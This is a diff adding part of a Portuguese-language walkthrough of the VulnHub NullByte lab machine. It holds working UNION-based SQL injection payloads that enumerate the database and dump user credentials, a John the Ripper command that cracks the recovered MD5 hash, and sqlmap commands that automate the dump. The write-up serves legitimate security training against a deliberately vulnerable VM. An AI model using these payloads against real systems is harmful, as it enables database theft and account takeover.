@@ -280,4 +280,118 @@ Ao mandarmos uma aspas dupla temos a mensagem de erro
 
 Isso indica que possivelmente temos um SQLInjection ai pra explorar
 
+Tentamos a clássica UNION SELECT para descobrirmos a quantidade de colunas que temos do outro lado
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp6.png)
+
+Descobrimos que são 3, agora vamos verificar qual delas conseguimos manipular
+
+Verificamos que conseguimos manipular as 3
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp7.png)
+
+Outra forma de conseguirmos verificar qual é a database é através da INFORMATION_SCHEMA que é o "rascunho" de todas as databases do mysql
+
+[Referencia](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
+
+**database = SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA**
+
+O payload ficará
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+SCHEMA_NAME,2,3+FROM+INFORMATION_SCHEMA.SCHEMATA+--+-
+```
+
+Ai está!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli.png)
+
+Vamos extrair agora as Tables, para isso vamos usar a query **Group Concat** pois ela possibilita termos mais de um resultado na mesma linha, facilitando assim a extração de informações
+
+O payload ficará
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(SCHEMA_NAME),2,3+FROM+INFORMATION_SCHEMA.SCHEMATA+--+-
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli1.png)
+
+Agora vamos veficar quais as tables dentro dessa database **seth** para isso vamos utilizar da query TABLE_NAME
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(TABLE_NAME),2,3+from+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+%3d+"seth"+--+- 
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli2.png)
+
+Agora vamos extrair as colunas (COLUMN_NAME) das tables
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+--+- 
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli3.png)
+
+De uma maneira mais organizada...
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(TABLE_NAME,"%3a",COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+--+-
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli4.png)
+
+Destrinchando melhor...
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+and+TABLE_NAME="users"+--+-
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli5.png)
+
+O que essa query vai me trazer? Traduzindo… me traga o nome das colunas (COLUMN_NAME) dentro da information schema de todas as colunas (INFORMATION_SCHEMA.COLUMNS) onde eu quero somente da database **seth** (TABLE_SCHEMA) e o nome da tabela dentro dessa database é **users** (TABLE_NAME). Ficou melhor assim?
+
+Certo, agora vamos extrair aquelas informações da database **seth** com as tables **user** e **pass**
+
+```
+GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(user,"%3a",pass),2,3+from+seth.users--+-
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli6.png)
+
+**ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE**
+
+Essa string é um base64, decodamos ele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli7.png)
+
+Gerou um hash md5, quebramos ele
+
+```bash
+john hash --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt --format=raw-md5
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/md5s.png)
+
+A senha é omega... bom... temos um ssh lá, agora podemos logar com o usuário ramses e a senha omega... mas antes vamos fazer umas outras coisas mais, pra fins de demonstração.
+
+## SQLMap
+
+A primeira é a utilização da ferramenta SQLMap para extração do hash, vai ver que facilita muuuito na hora de extrair informações do banco de dados, mas o problema é que automatiza muito, isso as vezes acaba atrapalhando por que você não entende o que está acontecendo por traz dos panos... Mas vamos lá
+
+```bash
+sqlmap -u http://192.168.56.118/kzMb5nVYJw/420search.php?usrtosearch=
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap1.png)
+
+Agora extraimos...
+
+```bash
+sqlmap -u http://192.168.56.118/kzMb5nVYJw/420search.php?usrtosearch= --dump
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap2.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap3.png)
